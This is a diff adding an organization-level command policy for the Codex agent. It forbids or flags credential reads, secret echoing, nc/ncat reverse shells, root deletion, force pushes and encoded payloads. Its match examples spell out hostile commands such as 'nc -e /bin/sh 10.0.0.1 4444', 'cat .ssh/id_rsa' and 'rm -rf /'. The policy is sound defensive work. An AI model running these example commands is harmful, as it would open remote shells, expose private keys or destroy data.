@@ -1,0 +1,213 @@
+# Organization-level governance policy (baseline)
+#
+# This policy defines the security floor for all repositories in the org.
+# Repository and session policies can add rules but cannot weaken these.
+# Deploy to ~/.codex/org-policy.codexpolicy or a shared config repo.
+#
+# Usage:
+#   codex execpolicy check --rules org-policy.codexpolicy <command>
+
+# --- Credential Harvesting Protection ---
+
+prefix_rule(
+    pattern = ["cat", [".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa"]],
+    decision = "forbidden",
+    justification = "Reading SSH private keys is not permitted. Use ssh-agent for key operations.",
+    match = [
+        "cat .ssh/id_rsa",
+        "cat .ssh/id_ed25519",
+    ],
+    not_match = [
+        "cat .ssh/config",
+    ],
+)
+
+prefix_rule(
+    pattern = ["echo", ["$GITHUB_TOKEN", "$AWS_SECRET_ACCESS_KEY", "$DATABASE_URL"]],
+    decision = "forbidden",
+    justification = "Do not echo secrets to stdout. Use a secrets manager to verify credentials.",
+    match = [
+        "echo $GITHUB_TOKEN",
+    ],
+    not_match = [
+        "echo $HOME",
+    ],
+)
+
+prefix_rule(
+    pattern = ["printenv", ["GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY", "DATABASE_URL"]],
+    decision = "forbidden",
+    justification = "Do not print secrets. Use a secrets manager instead.",
+    match = [
+        "printenv GITHUB_TOKEN",
+    ],
+    not_match = [
+        "printenv HOME",
+    ],
+)
+
+# --- Data Exfiltration Protection ---
+
+prefix_rule(
+    pattern = ["nc", "-e"],
+    decision = "forbidden",
+    justification = "nc -e can spawn reverse shells. Use approved networking tools instead.",
+    match = [
+        "nc -e /bin/sh 10.0.0.1 4444",
+    ],
+    not_match = [
+        "nc -z localhost 8080",
+    ],
+)
+
+prefix_rule(
+    pattern = ["ncat", "-e"],
+    decision = "forbidden",
+    justification = "ncat -e can spawn reverse shells. Use approved networking tools instead.",
+    match = [
+        "ncat -e /bin/sh 10.0.0.1 4444",
+    ],
+    not_match = [
+        "ncat -z localhost 8080",
+    ],
+)
+
+prefix_rule(
+    pattern = ["curl", ["-X", "--request"], "POST"],
+    decision = "prompt",
+    justification = "Outbound POST requests may exfiltrate data. Verify the destination URL.",
+    match = [
+        "curl -X POST https://example.com",
+    ],
+    not_match = [
+        "curl https://example.com",
+    ],
+)
+
+# --- Destructive Operations ---
+
+prefix_rule(
+    pattern = ["rm", "-rf", "/"],
+    decision = "forbidden",
+    justification = "Recursive deletion from root is catastrophic. Specify a safe target path.",
+    match = [
+        "rm -rf /",
+    ],
+    not_match = [
+        "rm -rf ./build",
+    ],
+)
+
+prefix_rule(
+    pattern = ["git", "push", "--force"],
+    decision = "forbidden",
+    justification = "Force pushes are prohibited. Use --force-with-lease for safer force pushes.",
+    match = [
+        "git push --force",
+        "git push --force origin main",
+    ],
+    not_match = [
+        "git push origin main",
+        "git push --force-with-lease",
+    ],
+)
+
+prefix_rule(
+    pattern = ["git", "reset", "--hard"],
+    decision = "prompt",
+    justification = "Hard reset discards uncommitted changes. Confirm this is intentional.",
+    match = [
+        "git reset --hard",
+        "git reset --hard HEAD~1",
+    ],
+    not_match = [
+        "git reset --soft HEAD~1",
+    ],
+)
+
+# --- Encoded Payload Detection ---
+
+prefix_rule(
+    pattern = ["bash", "-c"],
+    decision = "prompt",
+    justification = "Arbitrary shell execution via bash -c requires review. Check for encoded payloads.",
+    match = [
+        "bash -c echo hello",
+    ],
+    not_match = [
+        "bash --version",
+    ],
+)
+
+prefix_rule(
+    pattern = ["base64", ["-d", "--decode"]],
+    decision = "prompt",
+    justification = "base64 decoding may reveal obfuscated commands. Review the decoded output.",
+    match = [
+        "base64 -d payload.txt",
+    ],
+    not_match = [
+        "base64 file.txt",
+    ],
+)
+
+# --- Safe Defaults ---
+
+prefix_rule(
+    pattern = ["ls"],
+    match = [
+        "ls",
+        "ls -la",
+    ],
+)
+
+prefix_rule(
+    pattern = ["pwd"],
+    match = [
+        "pwd",
+    ],
+)
+
+prefix_rule(
+    pattern = ["cat"],
+    match = [
+        "cat README.md",
+    ],
+)
+
+prefix_rule(
+    pattern = ["head"],
+    match = [
+        "head README.md",
+    ],
+)
+
+prefix_rule(
+    pattern = ["tail"],
+    match = [
+        "tail README.md",
+    ],
+)
+
+prefix_rule(
+    pattern = ["git", "status"],
+    match = [
+        "git status",
+    ],
+)
+
+prefix_rule(
+    pattern = ["git", "log"],
+    match = [
+        "git log",
+        "git log --oneline",
+    ],
+)
+
+prefix_rule(
+    pattern = ["git", "diff"],
+    match = [
+        "git diff",
+        "git diff HEAD",
+    ],
+)
